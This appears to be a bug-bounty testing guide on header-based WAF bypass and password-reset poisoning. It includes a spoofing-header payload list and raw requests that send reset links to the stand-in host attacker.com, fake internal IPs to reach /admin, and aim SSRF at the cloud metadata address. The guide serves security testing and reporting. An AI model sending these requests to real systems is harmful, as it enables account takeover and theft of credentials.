# WAF Bypass Using Headers (Password Reset Poisoning)

Web application firewalls filter and monitor HTTP traffic, but many applications and misconfigured reverse proxies *trust* client-supplied headers (`Host`, `X-Forwarded-*`, `Referer`, IP-spoofing headers) to decide a user's origin, IP, or intended destination. Manipulating these lets an attacker slip past WAF rules, redirect password-reset links to their own domain, spoof trusted IPs, or coerce server-side fetches of internal resources. Header-trust bugs here typically escalate to account takeover (reset token theft) or access control bypass.

Overlapping routing-header techniques: [Host-Header.md](../Host-Header/Host-Header.md) · 403 trust-header cases: [403Bypass.md](../Status_Code_Bypass/403Bypass.md)

## Hunting Checklist

1. Identify header-trust surface: request password reset, account verification, and any link/email-generating flow while injecting one suspect header at a time.
2. For reset poisoning: replace/via `Host`, `X-Forwarded-Host`, `X-Forwarded`, or `X-Forwarded_Server` with an attacker domain and check the emailed link's host.
3. For IP-restriction bypass: replay blocked requests with each internal-IP header below (`127.0.0.1` / `::1` / private ranges) — compare against the plain request's 403.
4. For cache/routing abuse: combine headers with path fuzzing (see Host-Header doc).
5. Watch for WAF-layer differences: send the same payload with/without the header to see whether the WAF (not the app) blocked it.
6. Confirm blind-side effects with interaction: register a victim-like address, trigger flows, and observe tokens/redirects arriving at your listener.

## Test Cases & Examples

### Header list commonly used for WAF bypass & server-side manipulation

```http
X-Forwarded-Host: attacker.com
X-Forwarded-Port: 443
X-Forwarded-Scheme: https
Origin: null
nullOrigin: [siteDomain].attacker.com
X-Frame-Options: Allow
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
Proxy-Host: 127.0.0.1
Request-Uri: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
Base-Url: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Url: 127.0.0.1
Redirect: 127.0.0.1
Real-Ip: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Forwarded-Server:
X-Rewrite-Url:
```

By modifying these headers an attacker can: trick the app into believing the request comes from a trusted source; redirect password-reset links to an attacker domain; bypass security by manipulating `X-Forwarded-For`, `Referer`, `Origin`; spoof a legitimate user via headers used for authentication. Misconfigured reverse proxies that trust client-IP headers also open **internal access**.

### Password reset poisoning

**Step 1 — identify:** many apps build reset links from `Host` or `Origin`; if those are unvalidated, the reset URL can be poisoned.

**Step 2 — manipulated request:**

```http
POST /reset-password HTTP/1.1
Host: victim-site.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

email=victim@victim.com
```

**Step 3 — result:** with no validation of `X-Forwarded-Host`, the email sent to the victim contains:

```text
https://attacker.com/reset?token=abcdef123456
```

When the victim clicks it, they are redirected to the attacker's site, where credentials can be stolen via phishing — and the reset token itself leaks to the attacker.

### Bypassing IP-based restrictions

**Step 1:** some applications block access based on the user's IP; if the WAF trusts `X-Forwarded-For`, an attacker can spoof their IP.

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 192.168.1.100
```

**Step 2:** if `192.168.1.100` is a trusted internal IP, access is granted.

### Exploiting open redirects via headers

Some applications use `Referer`, `Redirect`, or `X-Forwarded-Host` to construct redirect URLs:

```http
GET /login?redirect=https://victim.com HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

The victim is then redirected to a phishing page **hosted by the attacker**. (Parameter-side redirect bypasses: [Open_Redirection_Bypass.md](../Open_Redirection/Open_Redirection_Bypass.md).)

### SSRF (Server-Side Request Forgery) exploitation

Some applications fetch remote resources based on user input; modified headers can force fetches of internal resources — AWS metadata or other sensitive internal services:

```http
GET /api/v1/fetch HTTP/1.1
Host: target.com
X-Forwarded-For: 169.254.169.254
X-Real-IP: 169.254.169.254
```

If the application fetches the resource using these headers, it could leak AWS credentials or internal system information. (Full SSRF methodology: [SSRF.md](../SSRF/SSRF.md).)

## Bypass Techniques

- Send **one** suspect header per request — multiple at once mask which one the backend trusts.
- If a header name is filtered, use the sibling list above (`X-Forwarder-For`, `X-Forwarded-For-Original`, `X-Http-Host-Override`, `Client-Ip`, `True-Client-Ip`, `X-Azure-Ref`, etc. all appear in real stacks).
- Case/whitespace/LWS variations (`X-fOrWaRdEd-For:`, tab before the value) defeat case-sensitive and naive-whitespace WAF regexes.
- Duplicate headers (`X-Forwarded-For: 1.2.3.4` twice) probe first-vs-last-value parsing differences between WAF and origin.
- IPv6/internal formats (`::1`, `10.0.0.1`, decimal/octal IP encodings) when `127.0.0.1` is specifically filtered.
- Domain-confusion values (`site.com.attacker.com`) follow the same endsWith logic as [CORS bypasses](../CORS/CORS_Bypasses.md).

## Tools & Resources

- Burp Repeater + match/replace rules for header rotation; Turbo Intruder for large header×value matrices
- [Host-Header.md](../Host-Header/Host-Header.md) (routing-header tests) · [403Bypass.md](../Status_Code_Bypass/403Bypass.md) (IP trust headers on 403s)
- References: OWASP [Testing for Host Header](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Tests_for_Logic_Circumvention/) & PortSwigger research on web cache poisoning and host-header attacks
- Authors: **[Virdoex_hunter](https://twitter.com/Virdoex_hunter)** · **[remonsec](https://x.com/remonsec)**

## Report Tips

- For reset poisoning, the money shot is the **emailed link containing your domain** (screenshot of inbox + token in URL) — state the impact as token theft → account takeover.
- Include a negative control: the same request without the header produces the normal link/403 — this proves the header, not app logic, is the flaw.
- If only a 302/redirect to your host occurs (no token), report it as host-header-driven open redirect/phishing with the exact user-visible context; avoid claiming ATO you didn't demonstrate.
